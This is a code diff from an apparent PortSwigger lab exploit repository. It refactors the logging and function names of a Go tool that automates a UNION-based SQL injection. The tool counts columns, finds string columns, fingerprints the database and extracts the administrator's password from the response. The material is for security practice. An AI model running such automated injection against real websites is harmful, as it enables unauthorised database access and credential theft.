@@ -9,6 +9,7 @@ import (
 	"strings"
 
 	"github.com/PuerkitoBio/goquery"
+	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_6/logger"
 )
 
 // SQLInjectionTester handles the specific steps of the SQL injection attack.
@@ -17,9 +18,9 @@ type SQLInjectionTester struct {
 	targetURL string // Base URL of the target lab
 }
 
-// makeRequest sends a GET request to the specified URL (including payload).
-func (t *SQLInjectionTester) makeRequest(fullURL string) (*http.Response, error) {
-	fmt.Printf("[~] Sending request: %s\n", fullURL) // Use ~ for in-progress actions
+// sendRequest sends a GET request to the specified URL (including payload).
+func (t *SQLInjectionTester) sendRequest(fullURL string) (*http.Response, error) {
+	logger.Infof("Sending request to: %s", fullURL)
 
 	req, err := http.NewRequest(http.MethodGet, fullURL, nil)
 	if err != nil {
@@ -44,7 +45,7 @@ func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
 		payload := strings.Replace(payloadToGetNumOfColumns, "{}", strconv.Itoa(col), 1)
 		urlWithPayload := baseURL + payload
 
-		resp, err := t.makeRequest(urlWithPayload)
+		resp, err := t.sendRequest(urlWithPayload)
 		if err != nil {
 			// Don't close body here, as resp might be nil
 			return 0, fmt.Errorf("request failed while checking column %d: %w", col, err)
@@ -64,7 +65,7 @@ func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
 
 		// Optional: Check for other error codes if needed
 		if resp.StatusCode != http.StatusOK {
-			fmt.Printf("[!] Unexpected status code %d while checking column %d\n", resp.StatusCode, col)
+			logger.Warningf("Unexpected status code %d for column %d", resp.StatusCode, col)
 			// Continue searching, but log it
 		}
 	}
@@ -72,9 +73,9 @@ func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
 	return 0, fmt.Errorf("failed to determine number of columns within search limit (%d)", maxColumnSearch)
 }
 
-// getTargetUser performs the UNION attack and extracts the administrator's password.
+// GetTargetUser performs the UNION attack and extracts the administrator's password.
 // It assumes the number of columns is already known.
-func (t *SQLInjectionTester) getTargetUser(numOfColumns int) (string, error) {
+func (t *SQLInjectionTester) GetTargetUser(numOfColumns int) (string, error) {
 	// 1. Execute the attack request
 	response, err := t.performSQLAttack(numOfColumns)
 	if err != nil {
@@ -94,7 +95,7 @@ func (t *SQLInjectionTester) getTargetUser(numOfColumns int) (string, error) {
 	if !strings.Contains(responseText, username) {
 		return "", fmt.Errorf("response body does not contain the target username '%s'", username)
 	}
-	fmt.Println("[+] Target username found in response.")
+	logger.Infof("Response body contains the target username '%s'", username)
 
 	// 3. Parse the HTML to find the password associated with the username
 	// This parsing logic is specific to the expected HTML structure of the lab response.
@@ -147,7 +148,7 @@ func (t *SQLInjectionTester) performSQLAttack(numOfColumns int) (*http.Response,
 	// Generate the final payload
 	fullURL := strings.Replace(fullURLWithStrPlaceholder, stringPlaceholder, userPassColumn, 1)
 
-	resp, err := t.makeRequest(fullURL)
+	resp, err := t.sendRequest(fullURL)
 	if err != nil {
 		// Don't close body here, resp might be nil
 		return nil, fmt.Errorf("request failed for attack payload: %w", err)
@@ -160,7 +161,7 @@ func (t *SQLInjectionTester) performSQLAttack(numOfColumns int) (*http.Response,
 		return nil, fmt.Errorf("unexpected status code %d (expected %d) for attack payload", resp.StatusCode, http.StatusOK)
 	}
 
-	fmt.Printf("[+] Received expected status code %d for UNION attack.\n", resp.StatusCode)
+	logger.Infof("Received expected status code %d for UNION attack", resp.StatusCode)
 	// Return the response object; the caller is responsible for closing the body
 	return resp, nil
 }
@@ -170,7 +171,7 @@ func (t *SQLInjectionTester) genPayloadWithStr(numOfColumns int) (string, error)
 		payload := strings.Replace(payloadWithUNION, "{}", demoString, 1)
 		fullURL := t.targetURL + uriPath + payload
 
-		resp, err := t.makeRequest(fullURL)
+		resp, err := t.sendRequest(fullURL)
 		if err != nil {
 			return "", fmt.Errorf("request failed for attack payload: %w", err)
 		}
@@ -189,7 +190,6 @@ func (t *SQLInjectionTester) genPayloadWithStr(numOfColumns int) (string, error)
 		values[i] = demoString
 		for j := range numOfColumns {
 			if j != i {
-				fmt.Printf("[~] Adding NULL to column I: %d , J: %d\n",i, j)
 				values[j] = "NULL"
 			}
 		}
@@ -198,7 +198,7 @@ func (t *SQLInjectionTester) genPayloadWithStr(numOfColumns int) (string, error)
 		payload := strings.Replace(payloadWithUNION, "{}", selectColumns, 1)
 		fullURL := t.targetURL + uriPath + payload
 
-		resp, err := t.makeRequest(fullURL)
+		resp, err := t.sendRequest(fullURL)
 		if err != nil {
 			return "", fmt.Errorf("request failed for attack payload: %w", err)
 		}
@@ -215,7 +215,7 @@ func (t *SQLInjectionTester) genPayloadWithStr(numOfColumns int) (string, error)
 func (t *SQLInjectionTester) findDatabaseType(fullURLWithStrPlaceholder string) (Database, error) {
 	for _, db := range databases {
 		fullURL := strings.Replace(fullURLWithStrPlaceholder, stringPlaceholder, db.versionFunction, 1)
-		resp, err := t.makeRequest(fullURL)
+		resp, err := t.sendRequest(fullURL)
 		if err != nil {
 			return Database{}, fmt.Errorf("request failed for attack payload: %w", err)
 		}
